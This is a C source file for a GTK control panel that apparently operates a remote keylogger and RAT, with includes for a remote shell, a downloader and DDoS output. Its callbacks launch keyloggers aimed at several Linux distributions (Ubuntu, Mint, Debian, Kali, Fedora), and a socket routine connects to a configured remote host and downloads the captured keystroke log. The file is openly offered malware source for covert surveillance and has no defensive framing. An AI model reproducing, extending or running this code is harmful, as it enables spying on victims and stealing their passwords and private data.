#include <stdio.h>
#include <stdlib.h>
#include <string.h>  //strlen()

#include <sys/types.h>  // send()
#include <sys/socket.h>  // send()
#include <netinet/in.h>  // SOCKADDR_IN
#include <arpa/inet.h>  // inet_addr()
#include <netdb.h>  //gethostbyaddr()

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/constants.h"
#include "../includes/callbacks_keyloggers.h"
#include "../includes/keylogger.h"
#include "../includes/utils.h"
#include "../includes/remote_shell.h"
#include "../includes/downloader.h"


GtkWidget *main_win;

const gchar *chemin;
GtkWidget *upload_entry;

const gchar *server_ip;
const gchar *server_port;
int port;

GtkWidget *text_view;

SOCKET remote_shell_sock;

GtkWidget *rs_text_view;

GtkWidget *ddos_text_view;



void cb_ubuntu16_run_the_keylogger(GtkButton *button, gpointer user_data)
{
    GtkWidget *launch_keylogger_dialog = NULL;

    launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Ubuntu 16.04 Keylogger ?");
    
    gtk_widget_show_all(GTK_DIALOG(launch_keylogger_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(launch_keylogger_dialog)))
    {
        case GTK_RESPONSE_YES:
            gtk_widget_destroy(launch_keylogger_dialog);
            ubuntu16_init_keylogger();
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(launch_keylogger_dialog);
            break;
    }

    /* Parametres inutilises */
    (void)button;
    (void)user_data;

    return;
}

void cb_ubuntu18_run_the_keylogger(GtkButton *button, gpointer user_data)
{
    GtkWidget *launch_keylogger_dialog = NULL;

    launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Ubuntu 18 Keylogger ?");
    
    gtk_widget_show_all(GTK_DIALOG(launch_keylogger_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(launch_keylogger_dialog)))
    {
        case GTK_RESPONSE_YES:
            gtk_widget_destroy(launch_keylogger_dialog);
            ubuntu18_init_keylogger();
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(launch_keylogger_dialog);
            break;
    }

    /* Parametres inutilises */
    (void)button;
    (void)user_data;

    return;

}


void cb_mint_run_the_keylogger(GtkButton *button, gpointer user_data)
{
    GtkWidget *launch_keylogger_dialog = NULL;

    launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Mint 19 Keylogger ?");
    
    gtk_widget_show_all(GTK_DIALOG(launch_keylogger_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(launch_keylogger_dialog)))
    {
        case GTK_RESPONSE_YES:
            gtk_widget_destroy(launch_keylogger_dialog);
            mint_init_keylogger();
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(launch_keylogger_dialog);
            break;
    }

    /* Parametres inutilises */
    (void)button;
    (void)user_data;

    return;
}

void cb_debian_run_the_keylogger(GtkButton *button, gpointer user_data)
{
    GtkWidget *launch_keylogger_dialog = NULL;

    launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Debian 9 Keylogger ?");
    
    gtk_widget_show_all(GTK_DIALOG(launch_keylogger_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(launch_keylogger_dialog)))
    {
        case GTK_RESPONSE_YES:
            gtk_widget_destroy(launch_keylogger_dialog);
            debian_init_keylogger();
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(launch_keylogger_dialog);
            break;
    }

    /* Parametres inutilises */
    (void)button;
    (void)user_data;

    return;
}

void cb_kali_run_the_keylogger(GtkButton *button, gpointer user_data)
{
    GtkWidget *launch_keylogger_dialog = NULL;
    
    launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Kali 2.0 Keylogger ?");
    
    gtk_widget_show_all(GTK_DIALOG(launch_keylogger_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(launch_keylogger_dialog)))
    {
        case GTK_RESPONSE_YES:
            gtk_widget_destroy(launch_keylogger_dialog);
            kali_init_keylogger();
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(launch_keylogger_dialog);
            break;
    }

    /* Parametres inutilises */
    (void)button;
    (void)user_data;

    return;
}

void cb_fedora_run_the_keylogger(GtkButton *button, gpointer user_data)
{
    GtkWidget *launch_keylogger_dialog = NULL;

    launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch Fedora 28 Keylogger ?");
    
    gtk_widget_show_all(GTK_DIALOG(launch_keylogger_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(launch_keylogger_dialog)))
    {
        case GTK_RESPONSE_YES:
            gtk_widget_destroy(launch_keylogger_dialog);
            fedora_init_keylogger();
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(launch_keylogger_dialog);
            break;
    }

    /* Parametres inutilises */
    (void)button;
    (void)user_data;

    return;
}


void cb_download_log_file(GtkButton *button, gpointer user_data)
{
    SOCKET sock;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    char buffer[BUFSIZ] = "";

    long tailleBlockRecut = 0;
    long data_len = 0;
    long totalRcv = 0;

    FILE *log_file = NULL;
    FILE *final_log_file = NULL;
    size_t flag_log = 6;
    int log_empty = -1;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    char caractere = 0;
    size_t i = 0;
    gboolean bInconsistent;
    
    log_file = fopen("keylogger.log", "w");
    if(log_file == NULL)
    {
        perror("log_file ");
        return;
    }

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "cb_download_log_file()");
        return;
    }

    if(connect(sock, (SOCKADDR*)&sin, sizeof(sin)) == SOCKET_ERROR)
    {
        error("connect()", "cb_download_log_file()");
        return;
    }

    if(send(sock, (char*)&flag_log, sizeof(flag_log), 0) == SOCKET_ERROR)
    {
        error("send() flag_log", "cb_download_log_file()");
        return;
    }
    
    if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
    {
        error("recv() data_len", "cb_download_log_file()");
        return;
    }
    
    printf("\nRecive weight of the file : %ld\n", data_len);

    do
    {
        tailleBlockRecut = recv(sock, buffer, data_len, 0);
        if(tailleBlockRecut < 0)
        {
            error("recv() buffer", "cb_download_log_file()");
            return;
        }

        fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, log_file);

        totalRcv += tailleBlockRecut;

    }while(totalRcv < data_len);
    
    printf("Log receive with success : %ld\n", totalRcv);
   
    
    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer((GtkTextView*)text_view);

    /* Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, "Log File Received ...", -1);

    /* Obtain iters for the start and end of points of the buffer */
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /* Get the entire buffer text. */
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /* Print the text */
    g_print("%s", text);

    g_free(text);
 
    fclose(log_file);

    /* Unused Parameters */
    (void)button;
    (void)user_data;
    
    return;
}


/*   
if(data_len == 0)
    {
        bInconsistent = gtk_toggle_button_get_inconsistent(GTK_TOGGLE_BUTTON(button));
        gtk_toggle_button_set_inconsistent(GTK_TOGGLE_BUTTON(button), (bInconsistent ^ FALSE));
        return;
    }
 */